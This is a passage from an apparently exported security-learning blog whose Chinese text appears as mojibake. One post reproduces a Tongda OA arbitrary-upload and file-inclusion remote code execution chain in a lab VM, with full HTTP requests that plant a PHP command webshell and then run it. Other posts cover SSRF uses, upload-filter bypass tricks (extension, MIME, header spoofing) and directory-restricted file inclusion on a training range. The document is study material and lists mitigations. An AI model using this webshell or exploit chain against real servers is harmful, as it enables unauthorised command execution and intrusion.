<h3 id="2-4-å¯åŠ¨å®Œæˆåè®¿é—®http-127-0-0-1å³å¯è®¿é—®é¦–é¡µï¼ˆå¦‚æœç«¯å£è®¾ç½®çš„æ˜¯é»˜è®¤80ï¼‰ã€‚"><a href="#2-4-å¯åŠ¨å®Œæˆåè®¿é—®http-127-0-0-1å³å¯è®¿é—®é¦–é¡µï¼ˆå¦‚æœç«¯å£è®¾ç½®çš„æ˜¯é»˜è®¤80ï¼‰ã€‚" class="headerlink" title="2.4 å¯åŠ¨å®Œæˆåè®¿é—®http://127.0.0.1å³å¯è®¿é—®é¦–é¡µï¼ˆå¦‚æœç«¯å£è®¾ç½®çš„æ˜¯é»˜è®¤80ï¼‰ã€‚"></a>2.4 å¯åŠ¨å®Œæˆåè®¿é—®<a href="http://127.0.0.1å³å¯è®¿é—®é¦–é¡µï¼ˆå¦‚æœç«¯å£è®¾ç½®çš„æ˜¯é»˜è®¤80ï¼‰ã€‚" target="_blank" rel="noopener">http://127.0.0.1å³å¯è®¿é—®é¦–é¡µï¼ˆå¦‚æœç«¯å£è®¾ç½®çš„æ˜¯é»˜è®¤80ï¼‰ã€‚</a></h3><p><img src="/2020/04/14/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/image-20200414232935236.png" alt="image-20200414232935236"></p>
<h3 id="2-5-è®¿é—®ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´è·¯å¾„ï¼ˆè¿™é‡Œçš„192-168-0-102æ˜¯è¿è¡ŒOAç¯å¢ƒçš„è™šæ‹Ÿæœºipï¼‰ã€‚"><a href="#2-5-è®¿é—®ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´è·¯å¾„ï¼ˆè¿™é‡Œçš„192-168-0-102æ˜¯è¿è¡ŒOAç¯å¢ƒçš„è™šæ‹Ÿæœºipï¼‰ã€‚" class="headerlink" title="2.5 è®¿é—®ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´è·¯å¾„ï¼ˆè¿™é‡Œçš„192.168.0.102æ˜¯è¿è¡ŒOAç¯å¢ƒçš„è™šæ‹Ÿæœºipï¼‰ã€‚"></a>2.5 è®¿é—®ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´è·¯å¾„ï¼ˆè¿™é‡Œçš„192.168.0.102æ˜¯è¿è¡ŒOAç¯å¢ƒçš„è™šæ‹Ÿæœºipï¼‰ã€‚</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;ispirit&#x2F;im&#x2F;upload.php &#x2F;&#x2F;æ–‡ä»¶ä¸Šä¼ æ¼æ´è·¯å¾„</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/14/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/image-20200414233023289.png" alt="image-20200414233023289"></p>
<h3 id="2-6-burpæŠ“åŒ…ä¸Šä¼ å°é©¬ã€‚"><a href="#2-6-burpæŠ“åŒ…ä¸Šä¼ å°é©¬ã€‚" class="headerlink" title="2.6 burpæŠ“åŒ…ä¸Šä¼ å°é©¬ã€‚"></a>2.6 burpæŠ“åŒ…ä¸Šä¼ å°é©¬ã€‚</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ispirit/im/upload.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.0.102</span><br><span class="line"><span class="attribute">Content-Length</span>: 660</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=123</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="UPLOAD_MODE"</span><br><span class="line"></span><br><span class="line"><span class="attribute">2</span></span><br><span class="line"><span class="attribute">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="P"</span><br><span class="line"></span><br><span class="line"><span class="attribute">123</span></span><br><span class="line"><span class="attribute">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="DEST_UID"</span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="ATTACHMENT"; filename="jpg"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$command=$_POST['cmd'];</span><br><span class="line">$wsh = new COM('WScript.shell');</span><br><span class="line">$exec = $wsh-&gt;exec("cmd /c ".$command);</span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/14/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/image-20200415001900306.png" alt="image-20200415001900306"></p>
<h3 id="2-7-ä¸Šä¼ çš„æ–‡ä»¶ä¸åœ¨æ ¹ç›®å½•æ‰€ä»¥ï¼Œéœ€è¦æ–‡ä»¶åŒ…å«çš„æ¼æ´åŒ…å«è¯¥æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼Œä½¿ç”¨Burp-SuiteæŠ“åŒ…å‘é€ï¼Œæ„é€ æ–‡ä»¶åŒ…å«æ•°æ®åŒ…å¹¶æ‰§è¡Œå‘½ä»¤ã€‚"><a href="#2-7-ä¸Šä¼ çš„æ–‡ä»¶ä¸åœ¨æ ¹ç›®å½•æ‰€ä»¥ï¼Œéœ€è¦æ–‡ä»¶åŒ…å«çš„æ¼æ´åŒ…å«è¯¥æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼Œä½¿ç”¨Burp-SuiteæŠ“åŒ…å‘é€ï¼Œæ„é€ æ–‡ä»¶åŒ…å«æ•°æ®åŒ…å¹¶æ‰§è¡Œå‘½ä»¤ã€‚" class="headerlink" title="2.7 ä¸Šä¼ çš„æ–‡ä»¶ä¸åœ¨æ ¹ç›®å½•æ‰€ä»¥ï¼Œéœ€è¦æ–‡ä»¶åŒ…å«çš„æ¼æ´åŒ…å«è¯¥æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼Œä½¿ç”¨Burp SuiteæŠ“åŒ…å‘é€ï¼Œæ„é€ æ–‡ä»¶åŒ…å«æ•°æ®åŒ…å¹¶æ‰§è¡Œå‘½ä»¤ã€‚"></a>2.7 ä¸Šä¼ çš„æ–‡ä»¶ä¸åœ¨æ ¹ç›®å½•æ‰€ä»¥ï¼Œéœ€è¦æ–‡ä»¶åŒ…å«çš„æ¼æ´åŒ…å«è¯¥æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼Œä½¿ç”¨Burp SuiteæŠ“åŒ…å‘é€ï¼Œæ„é€ æ–‡ä»¶åŒ…å«æ•°æ®åŒ…å¹¶æ‰§è¡Œå‘½ä»¤ã€‚</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ispirit&#x2F;interface&#x2F;gateway.php &#x2F;&#x2F;æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢</span><br><span class="line">json&#x3D;&#123;&quot;url&quot;:&quot;..&#x2F;..&#x2F;general&#x2F;..&#x2F;..&#x2F;attach&#x2F;im&#x2F;2004&#x2F;1210160293.jpg&quot;&#125;&amp;cmd&#x3D;whoami &#x2F;&#x2F;æ–‡ä»¶åŒ…å«payloadï¼Œæ–‡ä»¶åæ˜¯ä¸Šä¼ åçš„è¿”å›åŒ…é‡Œçš„</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ispirit/interface/gateway.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.0.102</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 75</span><br><span class="line"></span><br><span class="line">json=&#123;"url":"../../general/../../attach/im/2004/1210160293.jpg"&#125;&amp;cmd=whoami</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/14/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E/image-20200415001943025.png" alt="image-20200415001943025"></p>
<h2 id="3-å½±å“ç‰ˆæœ¬"><a href="#3-å½±å“ç‰ˆæœ¬" class="headerlink" title="3. å½±å“ç‰ˆæœ¬"></a>3. å½±å“ç‰ˆæœ¬</h2><p>V11ç‰ˆ</p>
<p>2017ç‰ˆ</p>
<p>2016ç‰ˆ</p>
<p>2015ç‰ˆ</p>
<p>2013ç‰ˆ</p>
<p>2013å¢å¼ºç‰ˆ<br>æ–‡ä»¶åŒ…å«æ¼æ´åªæœ‰2017å’ŒV11.3ç‰ˆæœ¬å­˜åœ¨</p>
<h1 id="0x02-ç¼“è§£æªæ–½"><a href="#0x02-ç¼“è§£æªæ–½" class="headerlink" title="0x02 ç¼“è§£æªæ–½"></a><strong>0x02 ç¼“è§£æªæ–½</strong></h1><p>å®˜æ–¹ç›®å‰å·²å‘å¸ƒæ›´æ–°çš„ç‰ˆæœ¬ï¼Œå‡çº§OAåˆ°å¯¹åº”ç‰ˆæœ¬å³å¯è§£å†³è¯¥æ¼æ´é£é™©ã€‚</p>
<p>å®˜æ–¹æ›´æ–°é“¾æ¥ <a href>http://www.tongda2000.com/news/673.php</a></p>
<h1 id="0x03-å‚è€ƒèµ„æ–™"><a href="#0x03-å‚è€ƒèµ„æ–™" class="headerlink" title="0x03 å‚è€ƒèµ„æ–™"></a><strong>0x03 å‚è€ƒèµ„æ–™</strong></h1><p>[1] <a href="https://github.com/jas502n/OA-tongda-RCE" target="_blank" rel="noopener">https://github.com/jas502n/OA-tongda-RCE</a></p>
<p>[2] <a href="https://blog.csdn.net/god_zzZ/article/details/105192808?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-7&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-7]()" target="_blank" rel="noopener">https://blog.csdn.net/god_zzZ/article/details/105192808?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-7&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-7]()</a></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF</title>
    <url>/2020/03/19/SSRF/</url>
    <content><![CDATA[<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/gh0stkey/DoraBox" target="_blank" rel="noopener">https://github.com/gh0stkey/DoraBox</a></p>
<h1 id="0x00-æ¼æ´ç®€ä»‹"><a href="#0x00-æ¼æ´ç®€ä»‹" class="headerlink" title="0x00 æ¼æ´ç®€ä»‹"></a><strong>0x00 æ¼æ´ç®€ä»‹</strong></h1><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ˜¯è¦ç›®æ ‡ç½‘ç«™çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆå› ä¸ºä»–æ˜¯ä»å†…éƒ¨ç³»ç»Ÿè®¿é—®çš„ï¼Œæ‰€æœ‰å¯ä»¥é€šè¿‡å®ƒæ”»å‡»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿï¼Œä¹Ÿå°±æ˜¯æŠŠç›®æ ‡ç½‘ç«™å½“ä¸­é—´äººï¼‰</p>
<p>SSRF å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œæ–‡æ¡£ï¼Œç­‰ç­‰ã€‚</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦å¯¹ç›®æ ‡ç½‘ç«™çš„æ¶æ„äº†è§£ï¼Œè„‘å­äº†è¦æœ‰ä¸€ä¸ªæ¶æ„å›¾ã€‚æ¯”å¦‚ ï¼š Aç½‘ç«™ï¼Œæ˜¯ä¸€ä¸ªæ‰€æœ‰äººéƒ½å¯ä»¥è®¿é—®çš„å¤–ç½‘ç½‘ç«™ï¼ŒBç½‘ç«™æ˜¯ä¸€ä¸ªä»–ä»¬å†…éƒ¨çš„OAç½‘ç«™ã€‚<br>æ‰€ä»¥ï¼Œæˆ‘ä»¬æ™®é€šç”¨æˆ·åªå¯ä»¥è®¿é—®aç½‘ç«™ï¼Œä¸èƒ½è®¿é—®bç½‘ç«™ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åŒè¿‡aç½‘ç«™åšä¸­é—´äººï¼Œè®¿é—®bç½‘ç«™ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»bç½‘ç«™éœ€æ±‚ã€‚</p>
<h1 id="0x01-ssrfç”¨é€”"><a href="#0x01-ssrfç”¨é€”" class="headerlink" title="0x01 ssrfç”¨é€”"></a><strong>0x01 ssrfç”¨é€”</strong></h1><p>1.å†…å¤–ç½‘çš„ç«¯å£å’ŒæœåŠ¡æ‰«æ<br>2.ä¸»æœºæœ¬åœ°æ•æ„Ÿæ•°æ®çš„è¯»å–<br>3.å†…å¤–ç½‘ä¸»æœºåº”ç”¨ç¨‹åºæ¼æ´çš„åˆ©ç”¨<br>4.å†…å¤–ç½‘Webç«™ç‚¹æ¼æ´çš„åˆ©ç”¨</p>
<h1 id="0x02-æ¼æ´å¸¸è§å‡ºæ²¡ä½ç½®"><a href="#0x02-æ¼æ´å¸¸è§å‡ºæ²¡ä½ç½®" class="headerlink" title="0x02 æ¼æ´å¸¸è§å‡ºæ²¡ä½ç½®"></a><strong>0x02 æ¼æ´å¸¸è§å‡ºæ²¡ä½ç½®</strong></h1><p>æ‰€æœ‰è°ƒå¤–éƒ¨èµ„æºçš„å‚æ•°éƒ½æœ‰å¯èƒ½å­˜åœ¨ssrfæ¼æ´<br>1ï¼‰åˆ†äº«ï¼šé€šè¿‡URLåœ°å€åˆ†äº«ç½‘é¡µå†…å®¹<br>2ï¼‰è½¬ç æœåŠ¡<br>3ï¼‰åœ¨çº¿ç¿»è¯‘<br>4ï¼‰å›¾ç‰‡åŠ è½½ä¸ä¸‹è½½ï¼šé€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡<br>5ï¼‰å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½<br>6ï¼‰æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–è°ƒç”¨URLçš„åŠŸèƒ½<br>7ï¼‰ä»URLå…³é”®å­—ä¸­å¯»æ‰¾shareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3g<br>ã€isplayã€sourceURlã€imageURLã€domain</p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ </title>
    <url>/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/gh0stkey/DoraBox" target="_blank" rel="noopener">https://github.com/gh0stkey/DoraBox</a></p>
<h1 id="0x00-ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#0x00-ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0x00 ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a><strong>0x00 ä»»æ„æ–‡ä»¶ä¸Šä¼ </strong></h1><p>è¿™ä¸ªå°±ç›´æ¥ä¸Šä¼ äº† æ²¡ä»»ä½•è¯´çš„<br><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200318143903894.png" alt="image-20200318143903894"></p>
<h1 id="0x01-JSé™åˆ¶æ–‡ä»¶ä¸Šä¼ "><a href="#0x01-JSé™åˆ¶æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0x01 JSé™åˆ¶æ–‡ä»¶ä¸Šä¼ "></a><strong>0x01 JSé™åˆ¶æ–‡ä»¶ä¸Šä¼ </strong></h1><p>å‰ç«¯é™åˆ¶åç¼€åï¼Œä¸Šä¼ jpgæ–‡ä»¶ï¼Œæ‹¦åŒ…æ”¹åç¼€ç»•è¿‡</p>
<p>å‡†å¤‡çš„é©¬<br><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200318144329558.png" alt="image-20200318144329558"></p>
<p>åç¼€æ”¹æˆjpg ä¸Šä¼ æ‹¦åŒ…åå†æ”¹å›php</p>
<p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200318144912130.png" alt="image-20200318144912130"></p>
<p>æˆåŠŸè½åœ°</p>
<p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200318144925810.png" alt="image-20200318144925810"></p>
<h1 id="0x02-MIMEé™åˆ¶æ–‡ä»¶ä¸Šä¼ "><a href="#0x02-MIMEé™åˆ¶æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0x02 MIMEé™åˆ¶æ–‡ä»¶ä¸Šä¼ "></a><strong>0x02 MIMEé™åˆ¶æ–‡ä»¶ä¸Šä¼ </strong></h1><p>ä¸Šä¼ phpæ–‡ä»¶ï¼Œæ˜¾ç¤ºç±»å‹ä¸æ­£ç¡®ï¼Œå®é™…ä¸ŠMIMEéªŒè¯å°±æ˜¯æ£€æµ‹Content-typeå­—æ®µå€¼çš„ï¼Œç›´æ¥æ›´æ”¹ä¸Šä¼ æ•°æ®åŒ…ä¸­çš„Content-typeå³å¯ç»•è¿‡</p>
<p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200318145307005.png" alt="image-20200318145307005"></p>
<p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200318150138406.png" alt="image-20200318150138406"></p>
<h1 id="0x03-æ‰©å±•åé™åˆ¶æ–‡ä»¶ä¸Šä¼ "><a href="#0x03-æ‰©å±•åé™åˆ¶æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0x03 æ‰©å±•åé™åˆ¶æ–‡ä»¶ä¸Šä¼ "></a><strong>0x03 æ‰©å±•åé™åˆ¶æ–‡ä»¶ä¸Šä¼ </strong></h1><p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200318151510536.png" alt="image-20200318151510536"></p>
<p>é‡‡ç”¨åç«¯éªŒè¯åç¼€åçš„æ–¹å¼ï¼Œè¿™ä¸ªæ–¹å¼æœ‰å¾ˆå¤šï¼Œä½†æ˜¯ä¼šæœ‰ç¯å¢ƒé™åˆ¶ï¼Œå®é™…ç¯å¢ƒä¸­éœ€è¦è¿›è¡Œæµ‹è¯•ä½¿ç”¨<br>æœåŠ¡ç«¯æ‰©å±•åéªŒè¯ç»•è¿‡æ–¹æ³•ï¼š<br>1ã€æ‰¾é»‘åå•æ‰©å±•åçš„æ¼ç½‘ä¹‹é±¼ - æ¯”å¦‚ä¸Šé¢å°±æ¼æ‰äº† asa å’Œ cer ä¹‹ç±»<br>2ã€å¯èƒ½å­˜åœ¨å¤§å°å†™ç»•è¿‡æ¼æ´ - æ¯”å¦‚ aSp å’Œ pHp ä¹‹ç±»<br>3ã€ç‰¹åˆ«æ–‡ä»¶åæ„é€  - æ¯”å¦‚å‘é€çš„ http åŒ…é‡ŒæŠŠæ–‡ä»¶åæ”¹æˆ help.asp. æˆ– help.asp_(ä¸‹åˆ’çº¿ä¸ºç©ºæ ¼)ï¼Œè¿™ç§å‘½åæ–¹å¼åœ¨ windows ç³»ç»Ÿé‡Œæ˜¯ä¸è¢«å…è®¸çš„ï¼Œæ‰€ä»¥éœ€è¦åœ¨ burp ä¹‹ç±»é‡Œè¿›è¡Œä¿®æ”¹ï¼Œ ç„¶åç»•è¿‡éªŒè¯åï¼Œä¼šè¢« windows ç³»ç»Ÿè‡ªåŠ¨å»æ‰åé¢çš„ç‚¹å’Œç©ºæ ¼ã€‚<br>4ã€IIS æˆ– nginx æ–‡ä»¶åè§£ææ¼æ´<br>æ¯”å¦‚ help.asp;.jpg æˆ– <a href="http://www.xx.com/help.jpg/2.php" target="_blank" rel="noopener">http://www.xx.com/help.jpg/2.php</a><br>è¿™é‡Œæ³¨æ„ç½‘ä¸Šæ‰€è°“çš„ nginx æ–‡ä»¶åè§£ææ¼æ´å®é™…ä¸Šæ˜¯ php-fpm æ–‡ä»¶åè§£ææ¼æ´ï¼Œè¯¦è§ <a href="http://www.cnbeta.com/articles/111752.htm" target="_blank" rel="noopener">http://www.cnbeta.com/articles/111752.htm</a><br>5ã€0x00 æˆªæ–­ç»•è¿‡ - è¿™ä¸ªæ˜¯åŸºäºä¸€ä¸ªç»„åˆé€»è¾‘æ¼æ´é€ æˆçš„<br>6ã€åŒæ‰©å±•åè§£æç»•è¿‡æ”»å‡»(1) - åŸºäº web æœåŠ¡çš„è§£æé€»è¾‘<br>æ¯”å¦‚ä¸Šä¼ x.php.rarç­‰æ–‡ä»¶<br>7ã€åŒæ‰©å±•åè§£æç»•è¿‡æ”»å‡»(2) - åŸºäº web æœåŠ¡çš„è§£ææ–¹å¼å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½®<br>AddHandler php5-script .php<br>è¿™æ—¶åªè¦æ–‡ä»¶åé‡ŒåŒ…å«.php<br>å³ä½¿æ–‡ä»¶åæ˜¯ test2.php.jpg ä¹Ÿä¼šä»¥ php æ¥æ‰§è¡Œ</p>
<p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200319111729252.png" alt="image-20200319111729252"></p>
<p>æµ‹è¯•ä¸Šä¼ åŠŸèƒ½å‰å¯ä»¥éšä¾¿è¾“å…¥ä¸€äº›åç¼€ ç›®çš„æ˜¯æµ‹è¯•ç›®æ ‡æ˜¯ç™½åå•è¿˜æ˜¯é»‘åå•</p>
<h1 id="0x04-å†…å®¹é™åˆ¶æ–‡ä»¶ä¸Šä¼ "><a href="#0x04-å†…å®¹é™åˆ¶æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0x04 å†…å®¹é™åˆ¶æ–‡ä»¶ä¸Šä¼ "></a><strong>0x04 å†…å®¹é™åˆ¶æ–‡ä»¶ä¸Šä¼ </strong></h1><p>æ–‡ä»¶ä¸Šä¼ è¿‡ç¨‹ä¸­å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯æ£€æµ‹ï¼Œé€šå¸¸æˆ‘ä»¬ä¼šä½¿ç”¨getimagesize()å‡½æ•°ï¼Œæ­¤å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªæ•°ç»„ã€‚</p>
<p>Array</p>
<p>(</p>
<p>â€‹    [0] =&gt; 2573</p>
<p>â€‹    [1] =&gt; 16188</p>
<p>â€‹    [2] =&gt; 1</p>
<p>â€‹    [3] =&gt; width=â€2573â€ height=â€16188â€</p>
<p>â€‹    [channels] =&gt; 3</p>
<p>â€‹    [mime] =&gt; image/gif</p>
<p>)</p>
<p>ä½¿ç”¨getimagesize()å‡½æ•°æ£€æµ‹ï¼Œä¼šåˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„å›¾ç‰‡æ–‡ä»¶ï¼Œå¦‚æœä¸æ˜¯åˆ™ä¼šæŠ¥é”™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ–‡ä»¶å¤´æ¬ºéª—æ¥ç»•è¿‡ã€‚<br><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200319112551251.png" alt="image-20200319112551251"></p>
<p>ä¸Šä¼ æˆåŠŸ<br><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200319112649041.png" alt="image-20200319112649041"></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶åŒ…å«</title>
    <url>/2020/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/gh0stkey/DoraBox" target="_blank" rel="noopener">https://github.com/gh0stkey/DoraBox</a></p>
<h1 id="0x00-ä»»æ„æ–‡ä»¶åŒ…å«"><a href="#0x00-ä»»æ„æ–‡ä»¶åŒ…å«" class="headerlink" title="0x00 ä»»æ„æ–‡ä»¶åŒ…å«"></a><strong>0x00 ä»»æ„æ–‡ä»¶åŒ…å«</strong></h1><p>çœ‹æºç çŸ¥é“æœ‰ä¸ªtxt.txtæ–‡ä»¶</p>
<p><a href="http://106.13.42.155:91/DoraBox-master/file_include/any_include.php?file=txt.txt&amp;submit=submit" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/file_include/any_include.php?file=txt.txt&amp;submit=submit</a></p>
<p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200318100531321.png" alt="image-20200318100531321"></p>
<h1 id="0x01-ç›®å½•é™åˆ¶æ–‡ä»¶åŒ…å«"><a href="#0x01-ç›®å½•é™åˆ¶æ–‡ä»¶åŒ…å«" class="headerlink" title="0x01 ç›®å½•é™åˆ¶æ–‡ä»¶åŒ…å«"></a><strong>0x01 ç›®å½•é™åˆ¶æ–‡ä»¶åŒ…å«</strong></h1><p>çœ‹ä¸‹æºç  åŠ äº†ä¸ª./</p>
<p><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200318104742941.png" alt="image-20200318104742941"></p>
<p>æˆ‘ä»¬åœ¨çœ‹ä¸‹ç½‘ç«™ç›®å½•<br><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200318104837254.png" alt="image-20200318104837254"></p>
<p>éšä¾¿è¾“å…¥ä¸€ä¸ª1  å¯ä»¥çœ‹åˆ°æ‰§è¡Œçš„./1<br><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200318105617002.png" alt="image-20200318105617002"><br>é‚£ä¹ˆåœ¨å½“å‰ç›®å½•ä¸‹ç›´æ¥txt.txt å°±æ„æˆäº†./txt.txt<br><img src="/2020/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200318141934213.png" alt="image-20200318141934213"></p>
